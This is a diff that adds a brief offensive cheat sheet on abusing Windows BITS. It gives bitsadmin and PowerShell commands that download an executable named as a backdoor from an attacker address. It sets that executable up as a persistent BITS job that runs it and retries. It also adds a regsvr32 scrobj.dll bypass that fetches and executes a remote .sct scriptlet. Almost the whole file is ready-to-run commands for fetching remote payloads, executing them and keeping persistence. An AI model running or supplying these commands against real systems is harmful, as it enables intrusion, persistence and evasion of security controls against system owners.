@@ -1,0 +1,19 @@
+# Get file across network
+bitsadmin /transfer backdoor /download /priority high http://IP:port/file.exe C:\tmp\file.exe
+
+or the same but in ps
+
+Start-BitsTransfer -Source "http://10.0.2.21/pentestlab.exe" -Destination "C:\tmp\pentestlab.exe"
+
+# Execution
+
+bitsadmin /create backdoor
+bitsadmin /addfile backdoor "http://IP:port/file.exe"  "C:\tmp\file.exe"
+bitsadmin /SetNotifyCmdLine backdoor C:\tmp\file.exe NUL
+bitsadmin /SetMinRetryDelay "backdoor" 60
+bitsadmin /resume backdoor
+
+OR additionaly use regsvr bypass
+
+bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe "/s /n /u /i:http://10.0.2.21:8080/FHXSd9.sct scrobj.dll"
+bitsadmin /resume backdoor
